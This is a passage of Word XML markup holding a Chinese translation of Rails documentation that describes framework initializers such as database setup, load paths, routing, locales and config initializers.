          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.active_record</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的设置来建立 Action Record. 而这个初始化程序是将方法名作为 setters </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>send</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 给 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionRecord::Base</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并通过它传值来使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.active_record</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的设置的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F55F97"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active_record.initialize_database</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 从 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 加载数据库配置(默认)并为当前环境建立连接。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E60E9B1"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active_record.log_runtime</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 引入 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::Railties::ControllerRuntime</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，它会负责为请求代码块向日志器报告 Active Record 调用所使用的时间.(译者注: 就是说 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::Railties::ControllerRuntime</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会记录一个请求发生时调用 Active Record 所占用的时间到日志里)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F1E9DD"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active_record.set_dispatch_hooks</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的话，重置所有可重载的数据库连接。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A5B6D4"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action_mailer.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionMailer::Base.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — 如果它还没又被设置 — 为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056399F1"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action_mail.set_configs</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 通过使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_mailer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的设置来建立 Action Mailer. 而这个初始化程序是将方法名作为 setters </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>send</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 给 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionMailer::Base</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并通过它传值来使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.action_mailer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的设置的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59156B7F"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action_mail.compile_config_methods</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为指定的配置设置方法初始化，所以它们能被更快的访问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C9C2C7"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set_load_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个初始化程序在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>bootstrap_hook</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 之前运行。它将 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>vendor</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，所有在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路径下的目录和任何在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.load_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里指定的路径添加到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>$LOAD_PATH</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>里</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48420563"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set_autoload_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个初始化程序在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>bootstrap_hook</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 之前运行。 将 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下所有的目录和任何在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.autoload_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定的目录添加到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveSupport::Denpendencies.autoload_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D5908A"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add_routing_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 加载 (默认) 所有 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (在应用程序和 railties, 包括 engines 里的) 并为应用程序建立路由。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4716D559"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add_locales</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 添加 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/locales</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的所有文件(来自应用程序，railties 和 engines) 到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>I18n.load_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里，准备好这些文件中的翻译。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5203A1A8"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add_view_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 添加应用程序，railties 和 engines 里的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, 所以应用程序可以在这些路径里寻找视图文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705D7A34"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load_environment_config</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为当前环境加载加载 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/environments</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D26045E"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append_asset_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 寻找应用程序和所有附加的 railties 的资源路径，还有保存 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.static_asset_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中可用的目录列表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46825E25"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prepend_helpers_path</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 添加用程序的 helpers 的查询路径 添加来自应用程序，railties 和 engines 的路径，应用程序在这些路径中寻找 helpers。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12627CAC"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load_config_initializers</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 加载应用程序，railties 和 engines </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录下的所有 Ruby 文件。这些文件用于容纳在框架加载完毕后被使用的配置设置。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6755940B"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engines_blanik_point</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 提供初始化过程中的某个点来放置 hook， 然后你就可以让任何东西在 engines 之前被加载。在这个点之后，才轮到所有的 railtie 和 engine 运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591D67B9"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add_generator_templates</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 搜寻位于 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/templates</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
